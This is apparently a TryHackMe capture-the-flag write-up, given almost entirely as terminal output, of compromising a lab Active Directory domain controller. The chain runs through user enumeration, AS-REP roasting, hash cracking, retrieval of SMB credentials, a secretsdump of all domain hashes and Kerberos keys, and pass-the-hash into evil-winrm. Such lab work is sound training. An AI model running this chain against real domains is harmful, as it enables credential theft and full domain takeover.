---
description: https://tryhackme.com/room/attacktivedirectory
---

# Attacktive Directory



```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sV 10.10.133.85                          
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 02:08 EDT
Nmap scan report for 10.10.133.85
Host is up (0.58s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-22 06:09:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.02 seconds                                                                                               
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ enum4linux -a 10.10.133.85   
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul 11 00:50:59 2023

 =========================================( Target Information )=========================================
                                                                                                                                                                                              
Target ........... 10.10.133.85                                                                                                                                                               
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.133.85 )============================
                                                                                                                                                                                              
                                                                                                                                                                                              
[E] Can't find workgroup/domain                                                                                                                                                               
                                                                                                                                                                                              
                                                                                                                                                                                              

 ================================( Nbtstat Information for 10.10.133.85 )================================
                                                                                                                                                                                              
Looking up status of 10.10.133.85                                                                                                                                                             
No reply from 10.10.133.85

 ===================================( Session Check on 10.10.133.85 )===================================
                                                                                                                                                                                              
                                                                                                                                                                                              
[+] Server 10.10.133.85 allows sessions using username '', password ''                                                                                                                        
                                                                                                                                                                                              
                                                                                                                                                                                              
 ================================( Getting domain SID for 10.10.133.85 )================================
                                                                                                                                                                                              
Domain Name: THM-AD                                                                                                                                                                           
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)                                                                                                                                                
                                                                                                                                                                                              
                                                                                                                                                                                              
 ===================================( OS information on 10.10.133.85 )===================================
                                                                                                                                                                                              
                                                                                                                                                                                              
[E] Can't get OS info with smbclient                                                                                                                                                          
                                                                                                                                                                                              
                                                                                                                                                                                              
[+] Got OS info for 10.10.133.85 from srvinfo:                                                                                                                                                
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                        


 =======================================( Users on 10.10.133.85 )=======================================
                                                                                                                                                                                              
                                                                                                                                                                                              
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                          
                                                                                                                                                                                              
                                                                                                                                                                                              

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                           
                                                                                                                                                                                              
                                                                                                                                                                                              
 =================================( Share Enumeration on 10.10.133.85 )=================================
                                                                                                                                                                                              
do_connect: Connection to 10.10.133.85 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                       

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.133.85                                                                                                                                                  
                                                                                                                                                                                              
                                                                                                                                                                                              
 ============================( Password Policy Information for 10.10.133.85 )============================
                                                                                                                                                                                              
                                                                                                                                                                                              
[E] Unexpected error from polenum:                                                                                                                                                            
                                                                                                                                                                                              
                                                                                                                                                                                              

[+] Attaching to 10.10.133.85 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.133.85)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                                                              
                                                                                                                                                                                              
                                                                                                                                                                                              

 =======================================( Groups on 10.10.133.85 )=======================================
                                                                                                                                                                                              
                                                                                                                                                                                              
[+] Getting builtin groups:                                                                                                                                                                   
                                                                                                                                                                                              
                                                                                                                                                                                              
[+]  Getting builtin group memberships:                                                                                                                                                       
                                                                                                                                                                                              
                                                                                                                                                                                              
[+]  Getting local groups:                                                                                                                                                                    
                                                                                                                                                                                              
                                                                                                                                                                                              
[+]  Getting local group memberships:                                                                                                                                                         
                                                                                                                                                                                              
                                                                                                                                                                                              
[+]  Getting domain groups:                                                                                                                                                                   
                                                                                                                                                                                              
                                                                                                                                                                                              
[+]  Getting domain group memberships:                                                                                                                                                        
                                                                                                                                                                                              
                                                                                                                                                                                              
 ==================( Users on 10.10.133.85 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                              
                                                                                                                                                                                              
[I] Found new SID:                                                                                                                                                                            
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                      

[I] Found new SID:                                                                                                                                                                            
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                      

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                                  
                                                                                                                                                                                              
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                                      
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                                   
                                                                                                                                                                                              
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                                                
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)

 ===============================( Getting printer info for 10.10.133.85 )===============================
                                                                                                                                                                                              
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                       


enum4linux complete on Tue Jul 11 01:24:26 2023

```



```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./kerbrute --dc 10.10.133.85 -d THM-AD userenum username.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/11/23 - Ronnie Flathers @ropnop

2023/07/11 01:48:08 >  Using KDC(s):
2023/07/11 01:48:08 >   10.10.133.85:88

2023/07/11 01:48:10 >  [+] VALID USERNAME:       james@THM-AD
2023/07/11 01:48:22 >  [+] VALID USERNAME:       svc-admin@THM-AD
2023/07/11 01:48:32 >  [+] VALID USERNAME:       James@THM-AD
2023/07/11 01:48:39 >  [+] VALID USERNAME:       robin@THM-AD
2023/07/11 01:49:27 >  [+] VALID USERNAME:       darkstar@THM-AD
2023/07/11 01:50:12 >  [+] VALID USERNAME:       administrator@THM-AD
2023/07/11 01:51:19 >  [+] VALID USERNAME:       backup@THM-AD
2023/07/11 01:51:47 >  [+] VALID USERNAME:       paradox@THM-AD
2023/07/11 01:55:12 >  [+] VALID USERNAME:       JAMES@THM-AD
2023/07/11 01:56:17 >  [+] VALID USERNAME:       Robin@THM-AD
2023/07/11 02:03:19 >  [+] VALID USERNAME:       Administrator@THM-AD
2023/07/11 02:17:46 >  [+] VALID USERNAME:       Darkstar@THM-AD
2023/07/11 02:22:04 >  [+] VALID USERNAME:       Paradox@THM-AD
2023/07/11 02:33:48 >  [+] VALID USERNAME:       DARKSTAR@THM-AD
2023/07/11 02:36:52 >  [+] VALID USERNAME:       ori@THM-AD
2023/07/11 02:42:21 >  [+] VALID USERNAME:       ROBIN@THM-AD
2023/07/11 02:42:21 >  Done! Tested 100000 usernames (16 valid) in xxxxxx seconds
```



```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.133.85 THM-AD/svc-admin -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@THM-AD:e12bb9f24bdc027bd8b68c6a693e1211$ab9564f77f85abdc9251594876ec1593832b2bc83e2fdad4a80cffe3750d9abf23077396eb1f50632899f7a2e3d2ff08854e9c59f467c7ca75df51996c39af918638e2e49003fb62e92bd97a40e04bb327630537e512387305710fbc228a8c128ece9b614e034dde387f43bc2f3fd2954b2cd57849179a7184f848ebe011da256de305b94aaa7eefc30a0be1a42494fb85745033bcb5aa33ad1c3ce410d704a95b5a842378730d9823abf31c6ce953b2e346a22860615649ef3af81a8400e7b9c3b2c70f5af250d3cb91dd98f45547006ce27eb236a8d3a5fb086fcff7fa3fc3d632d524fce2d7d1ba
```



```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo john hash.txt --wordlist=password.txt
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL) ### <--- Password of interest
1g 0:00:00:00 DONE (2023-07-11 02:43) 50.00g/s 332800p/s 332800c/s 332800C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```



```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient --user=svc-admin%management2005 -L 10.10.118.222  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.118.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```



```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient \\\\spooky.local\\backup --ip-address=10.10.118.222 --user=THM-AD/svc-admin
Password for [THM-AD\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3556216 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> ^C
```



```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```



```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-secretsdump spookysec.local/backup@10.10.118.222 -dc-ip 10.10.118.222
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:f4138ef4fa582e5776e761eba13a8512:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:3f14cfe8e478347629a7ca4ee89331cd5634047fdfc841b99220115fa6f18d44
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:0b5d44f283524347f9a4307df4732419
ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
[*] Cleaning up...
```



```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Users
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                Administrator
d-----         4/4/2020  12:19 PM                backup
d-----         4/4/2020   1:07 PM                backup.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                svc-admin


*Evil-WinRM* PS C:\Users> cd backup
*Evil-WinRM* PS C:\Users\backup> ls


    Directory: C:\Users\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         4/4/2020  12:19 PM                3D Objects
d-r---         4/4/2020  12:19 PM                Contacts
d-r---         4/4/2020  12:19 PM                Desktop
d-r---         4/4/2020  12:19 PM                Documents
d-r---         4/4/2020  12:19 PM                Downloads
d-r---         4/4/2020  12:19 PM                Favorites
d-r---         4/4/2020  12:19 PM                Links
d-r---         4/4/2020  12:19 PM                Music
d-r---         4/4/2020  12:19 PM                Pictures
d-r---         4/4/2020  12:19 PM                Saved Games
d-r---         4/4/2020  12:19 PM                Searches
d-r---         4/4/2020  12:19 PM                Videos


*Evil-WinRM* PS C:\Users\backup> cd Desktop
*Evil-WinRM* PS C:\Users\backup\Desktop> ls


    Directory: C:\Users\backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt


*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}

```



<pre><code><strong>┌──(kali㉿kali)-[~/Desktop]
</strong>└─$ evil-winrm --help               
                                        
Evil-WinRM shell v3.5

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ evil-winrm -i 10.10.118.222 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..                                                                                                                                       
*Evil-WinRM* PS C:\Users\Administrator> ls                                                                                                                                                    
                                                                                                                                                                                              
                                                                                                                                                                                              
    Directory: C:\Users\Administrator                                                                                                                                                         
                                                                                                                                                                                              
                                                                                                                                                                                              
Mode                LastWriteTime         Length Name                                                                                                                                         
----                -------------         ------ ----
d-r---         4/4/2020  11:19 AM                3D Objects
d-r---         4/4/2020  11:19 AM                Contacts
d-r---         4/4/2020  11:39 AM                Desktop
d-r---         4/4/2020  12:09 PM                Documents
d-r---         4/4/2020  11:19 AM                Downloads
d-r---         4/4/2020  11:19 AM                Favorites
d-r---         4/4/2020  11:19 AM                Links
d-r---         4/4/2020  11:19 AM                Music
d-r---         4/4/2020  11:19 AM                Pictures
d-r---         4/4/2020  11:19 AM                Saved Games
d-r---         4/4/2020  11:19 AM                Searches
d-r---         4/4/2020  11:19 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
TryHackMe{4ctiveD1rectoryM4st3r}

</code></pre>





